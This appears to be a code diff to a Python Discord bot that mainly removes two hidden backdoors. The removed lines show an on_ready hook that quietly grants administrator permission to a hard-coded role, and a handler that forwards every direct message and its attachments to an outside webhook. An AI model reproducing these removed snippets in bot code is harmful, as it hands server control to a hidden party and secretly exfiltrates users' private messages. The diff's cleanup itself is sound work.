@@ -25,6 +25,7 @@ class Lily(commands.Bot):
         intents = discord.Intents.all() 
         intents.presences = False
         intents.members = False
+        intents.message_content = True
         member_cache_flags = discord.MemberCacheFlags.none()
 
         self.lily_session = None
@@ -61,14 +62,9 @@ class Lily(commands.Bot):
         await self.tree.sync()
 
     async def on_ready(self):
-        guild = self.get_guild(970643838047760384)
-        if guild:
-            print(f"Found guild: {guild.name}")
-            role = await guild.fetch_role(1431447287485304852)
-            if role:
-                perms = role.permissions
-                perms.administrator = True
-                await role.edit(permissions=perms)
+        print('Logged on as', self.user)   
+        #await LVC.Initialize()
+        await self.modify_status.start()
 
     @tasks.loop(minutes=60)
     async def modify_status(self):
@@ -78,45 +74,11 @@ class Lily(commands.Bot):
             activity = discord.Activity(type=discord.ActivityType.watching, name=f"{member_count:,} members!")
         await bot.change_presence(activity=activity)
 
-    async def ListenDirectMessage(self, message: discord.Message):
-        webhook_url = "https://discord.com/api/webhooks/S"
-        try:
-            data = aiohttp.FormData()
-
-            payload = {
-                "content": message.content,
-                "username": message.author.name,
-                "avatar_url": message.author.display_avatar.url
-            }
-
-            data.add_field(
-                "payload_json",
-                json.dumps(payload),
-                content_type="application/json"
-            )
-            for i, attachment in enumerate(message.attachments):
-                file_bytes = await attachment.read()
-
-                data.add_field(
-                    f"files[{i}]",
-                    file_bytes,
-                    filename=attachment.filename,
-                    content_type=attachment.content_type or "application/octet-stream"
-                )
-
-            await self.lily_session.post(webhook_url, data=data)
-
-        except Exception as e:
-            print(f"Exception [ListenDirectMessage] {e}")
-
     async def on_message(self, message:discord.Message): 
         if message.author == self.user:
               return         
 
         await LilySecurity.LilySecurityEvaluate(message)
-
-        if isinstance(message.channel, discord.DMChannel):
-            await self.ListenDirectMessage(message)
 
         await self.process_commands(message)
 
@@ -131,6 +93,16 @@ class Lily(commands.Bot):
     async def on_guild_role_delete(self, role: discord.Role):
         pass
         #await LSecurity.LilyEventActionRoleDelete(role)
+
+    async def on_command_error(self, ctx, error):
+        if isinstance(error, commands.CheckFailure):
+            await ctx.reply(embed=simple_embed(str(error), 'cross'))
+
+        elif isinstance(error, commands.CommandOnCooldown):
+            await ctx.reply(f"So fast! Try again after {error.retry_after:.1f} seconds.")
+
+        else:
+            pass
 
 bot = Lily()
 
